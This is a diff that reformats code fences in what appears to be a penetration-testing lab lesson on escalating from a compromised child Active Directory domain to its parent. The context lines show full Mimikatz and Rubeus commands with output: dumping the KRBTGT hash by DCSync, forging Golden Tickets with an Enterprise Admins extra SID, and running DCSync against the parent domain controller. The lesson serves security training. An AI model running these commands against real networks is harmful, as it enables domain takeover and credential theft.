@@ -31,8 +31,7 @@ Since we have compromised the child domain, we can log in as a Domain Admin or s
 
 #### Obtaining the KRBTGT Account's NT Hash using Mimikatz
 
-```
-        powershell
+```powershell
 PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
 [DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
 [DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
@@ -62,8 +61,7 @@ We can use the PowerView `Get-DomainSID` function to get the SID for the child d
 
 #### Using Get-DomainSID
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-DomainSID
 
 S-1-5-21-2806153819-209893948-922872689
@@ -73,8 +71,7 @@ Next, we can use `Get-DomainGroup` from PowerView to obtain the SID for the Ente
 
 #### Obtaining Enterprise Admins Group's SID using Get-DomainGroup
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
 
 distinguishedname                                       objectsid                                    
@@ -94,8 +91,7 @@ Before the attack, we can confirm no access to the file system of the DC in the 
 
 #### Using ls to Confirm No Access
 
-```
-        powershell
+```powershell
 PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
 
 ls : Access is denied
@@ -110,8 +106,7 @@ Using Mimikatz and the data listed above, we can create a Golden Ticket to acces
 
 #### Creating a Golden Ticket with Mimikatz
 
-```
-        powershell
+```powershell
 PS C:\htb> mimikatz.exe
 
 mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
@@ -138,8 +133,7 @@ We can confirm that the Kerberos ticket for the non-existent hacker user is resi
 
 #### Confirming a Kerberos Ticket is in Memory Using klist
 
-```
-        powershell
+```powershell
 PS C:\htb> klist
 
 Current LogonId is 0:0xf6462
@@ -162,8 +156,7 @@ From here, it is possible to access any resources within the parent domain, and 
 
 #### Listing the Entire C: Drive of the Domain Controller
 
-```
-        powershell
+```powershell
 PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
  Volume in drive \\academy-ea-dc01.inlanefreight.local\c$ has no label.
  Volume Serial Number is B8B3-0D72
@@ -188,8 +181,7 @@ We can also perform this attack using Rubeus. First, again, we'll confirm that w
 
 #### Using ls to Confirm No Access Before Running Rubeus
 
-```
-        powershell
+```powershell
 PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
 
 ls : Access is denied
@@ -207,8 +199,7 @@ Next, we will formulate our Rubeus command using the data we retrieved above. Th
 
 #### Creating a Golden Ticket using Rubeus
 
-```
-        powershell
+```powershell
 PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
 
    ______        _                      
@@ -282,8 +273,7 @@ Once again, we can check that the ticket is in memory using the `klist` command.
 
 #### Confirming the Ticket is in Memory Using klist
 
-```
-        powershell
+```powershell
 PS C:\htb> klist
 
 Current LogonId is 0:0xf6495
@@ -306,8 +296,7 @@ Finally, we can test this access by performing a DCSync attack against the paren
 
 #### Performing a DCSync Attack
 
-```
-        powershell
+```powershell
 PS C:\Tools\mimikatz\x64> .\mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
@@ -345,8 +334,7 @@ Credentials:
 
 When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller. The command for this would look like the following:
 
-```
-        powershell
+```powershell
 mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 
 [DC] 'INLANEFREIGHT.LOCAL' will be the domain
